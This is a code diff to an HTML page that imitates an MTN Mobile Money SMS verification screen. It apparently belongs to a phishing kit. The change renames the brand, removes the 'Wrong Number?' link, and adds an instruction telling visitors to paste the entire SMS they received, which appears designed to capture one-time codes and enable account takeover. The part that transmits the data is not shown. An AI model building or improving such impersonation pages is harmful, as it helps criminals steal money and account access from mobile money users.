@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>MTN MoMo - Verify</title>
+    <title>MTN Mobile Money - Verify</title>
     <style>
         * {
             margin: 0;
@@ -69,19 +69,17 @@
             font-size: 15px;
             color: #555;
             line-height: 1.5;
-            margin-bottom: 4px;
-        }
-        .wrong-number {
-            font-size: 15px;
-            color: #004B87;
-            text-decoration: none;
-            font-weight: 500;
-            display: inline-block;
             margin-bottom: 16px;
-            margin-top: 2px;
         }
-        .wrong-number:hover {
-            text-decoration: underline;
+        .instruction-note {
+            font-size: 14px;
+            color: #004B87;
+            background: #e8f0fe;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+            border: 1px solid #bbd4f0;
+            line-height: 1.6;
         }
         .valid-time {
             font-size: 14px;
@@ -193,18 +191,22 @@
             <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
                 <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
                 <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
-                <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN MoMo</text>
+                <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN Mobile Money</text>
             </svg>
             <span>Mobile Money</span>
         </div>
     </div>
 
     <div class="container">
-        <div class="title">Enter Code</div>
+        <div class="title">Verify Your SMS</div>
         <div class="subtitle" id="subtitlePlaceholder">
-            Enter the code that was sent to (+263) 712345678
+            We sent a code to your phone number
         </div>
-        <a href="details.html" class="wrong-number">Wrong Number?</a>
+
+        <div class="instruction-note">
+            📱 Copy the <strong>entire SMS message</strong> you received and paste it in the box below.
+        </div>
+
         <div class="valid-time">The code is valid for 20 seconds</div>
 
         <div class="message-area">
@@ -223,7 +225,7 @@
             const phone = localStorage.getItem('phone');
             const subtitle = document.getElementById('subtitlePlaceholder');
             if (phone) {
-                subtitle.textContent = 'Enter the code that was sent to ' + phone;
+                subtitle.textContent = 'We sent a code to ' + phone;
             }
         })();
     </script>
@@ -302,7 +304,7 @@
 
             const timerSpan = document.querySelector('.timer');
             const resendWrapEl = document.querySelector('.resend-wrap');
-            let totalSeconds = 20; // 20 seconds
+            let totalSeconds = 20;
             let interval = null;
 
             function formatTime(sec) {
